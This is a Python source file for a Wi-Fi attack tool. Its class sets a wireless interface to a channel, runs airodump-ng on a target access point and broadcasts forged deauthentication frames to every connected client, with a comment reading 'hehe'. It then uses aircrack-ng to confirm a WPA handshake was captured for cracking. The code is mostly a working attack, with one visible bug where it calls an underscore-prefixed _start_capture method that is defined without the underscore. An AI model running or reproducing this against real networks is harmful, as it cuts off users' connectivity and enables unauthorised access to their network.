import os
import time
import signal
import subprocess
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
from datetime import datetime
from wifi_base import WifiBase

class CaptureHandshake(WifiBase):
    def __init__(self, interface='wlan0', debug=False):
        super().__init__(interface, debug)
        self.capture_prefix = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
    def capture_handshake(self, bssid, channel, deauth_packets=25, capture_duration=30):
        #this will attempt to capture handshake
        if not self.set_interface_channel(channel):
            return None

        capture_file = self._start_capture(bssid, channel)
        if not capture_file:
            return None

        self._send_deauth_packets(bssid, deauth_packets)
        
        #wait for the handshake
        self.log_message(f"Capturing for {capture_duration} seconds...")
        time.sleep(capture_duration)
        
        #stop caputring 
        self.stop_capture()
        
        #verify the handshake
        if self._verify_handshake(capture_file):
            self.log_message("Successfully captured handshake!")
            return capture_file
        
        self.log_message("Failed to capture handshake", 'warning')
        return None
    
    def set_interface_channel(self, channel):
        self.log_message(f"Setting interface to channel {channel}...")
        return self.run_cmd(f"iwconfig {self.interface} channel {channel}")
    
    def start_capture(self, bssid, channel):
        #start capturing on the channel
        self.log_message(f"Starting capture on channel {channel} for BSSID {bssid}...")
        capture_cmd = (
            f"airodump-ng -c {channel} --bssid {bssid} "
            f"-w {self.capture_prefix} {self.interface} --output-format pcap"
        )
        
        self.capture_process = subprocess.Popen(
            capture_cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        
        time.sleep(3)  # Allow capture to initialize
        return f"{self.capture_prefix}-01.cap"
            
    def _send_deauth_packets(self, bssid, count):
        #send deauth packets
        self.log_message(f"Sending {count} deauthentication packets...")
        try:
            packet = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff", #Target all devices in the network(hehe)
                addr2=bssid,
                addr3=bssid
            ) / Dot11Deauth(reason=7)
            
            sendp(
                packet,
                iface=self.interface,
                count=count,
                inter=0.1,
                verbose=0
            )
        except Exception as error:
            self.log_message(f"Failed to send deauth packets: {str(error)}", 'error')
            
    def _verify_handshake(self, pcap_file):
        #Check if the capture file contains a valid handshake.
        if not os.path.exists(pcap_file):
            return False
            
        result = self.run_cmd(
            f"aircrack-ng {pcap_file} | grep 'WPA (1 handshake)'"
        )
        return "1 handshake" in result
    
    def stop_capture(self):
        if hasattr(self, "capture_process"):
            try:
                os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
                self.log_message("Capture process terminated successfully.")
            except Exception as error:
                self.log_message(f"Failed to stop capture process: {str(error)}", 'error')